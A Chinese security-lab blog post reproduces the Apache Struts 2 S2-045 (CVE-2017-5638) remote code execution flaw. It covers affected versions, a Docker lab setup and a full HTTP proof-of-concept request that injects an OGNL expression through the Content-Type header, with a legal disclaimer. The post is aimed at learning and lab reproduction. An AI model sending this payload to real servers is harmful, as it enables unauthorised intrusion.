#  S2-045远程代码执行漏洞（CVE-2017-5638）   
巢安实验室  巢安实验室   2023-12-19 18:04  
  
**漏洞简介**  
  
S2-045（CVE-2017-5638）是指Apache Struts 2框架中存在的一个严重的安全漏洞，该漏洞允许攻击者通过精心构造的恶意请求执行远程代码。这个漏洞的原理涉及到Apache Struts 2框架的文件上传组件（FileUploadInterceptor）的一个问题，该组件在处理文件上传时存在漏洞。  
  
**影响版本**  
  
Struts 2.3.5 - Struts 2.3.31、Struts 2.5 - Struts 2.5.10  
  
**环境搭建**  
  
拉取镜像，开启服务  
```
docker-compose up -d
```  
  
环境启动后，访问http://your-ip:8080  
即可看到上传页面。  
  
**漏洞复现**  
  
poc：  
```
POST / HTTP/1.1
Host: ip:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Content-Type:%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVwx2dpZ978zoEsAD6HYpUaUPdLHaf4Z5tcM8XtPdyic5kfTU1icibQTVicWmFbGFk0gRMFnCqz5MZOOeg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/n2rSqJSRAVxV1HkYIib6yljAwKc4l6avSghzm4fpJ4J9Loe5J4ZKkfGPD3HXXcTrD0h5eYI1lc6fGAtbhLyTeEw/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**  
  
****  
**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。公众号内容中部分攻防技巧等只允许在目标授权的情况下进行使用，大部分文章来自各大安全社区，个人博客，如有侵权请立即联系公众号进行删除。若不同意以上警告信息请立即退出浏览！！！**  
  
****  
**敲敲小黑板：《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。**  
  
